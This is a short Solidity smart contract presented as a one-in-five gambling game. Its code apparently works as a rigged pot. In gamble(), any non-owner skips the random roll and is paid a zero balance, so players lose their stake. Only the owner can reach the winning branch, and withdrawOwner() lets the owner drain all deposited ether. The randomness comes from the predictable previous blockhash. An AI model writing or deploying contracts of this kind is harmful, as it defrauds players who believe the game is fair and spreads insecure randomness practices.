1 pragma solidity ^0.4.0;
2 
3 contract OneInFive{
4     
5     event SpiceUpPot();
6     
7     mapping(address => uint256) balance;
8     
9     address owner;
10     
11     constructor() public payable{
12         require(msg.value >= .06 ether);
13         owner = msg.sender;
14     }
15     
16     function gamble() public payable{
17         require(msg.value >= .01 ether);
18         if(msg.sender!=owner || rollIt()){
19             withdrawPlayer();
20         }
21         else if(msg.sender==owner){
22             emit SpiceUpPot();
23         }
24     }
25     
26     function rollIt() private returns(bool){
27         bytes32 hash = keccak256(blockhash(block.number-1));
28         uint256 random = uint256(hash);
29         if(random%5==0){
30             balance[msg.sender] = address(this).balance;
31             return true;
32         }
33         else{
34             return false;
35         }
36     }
37     
38     function withdrawPlayer() internal{
39         uint256 amount = balance[msg.sender];
40         balance[msg.sender] = 0;
41         msg.sender.transfer(amount);
42     }
43     
44     function withdrawOwner() public{
45         if(msg.sender==owner){
46             owner.transfer(address(this).balance);
47         }
48     }
49     function() public payable{
50         gamble();
51     }
52     
53 }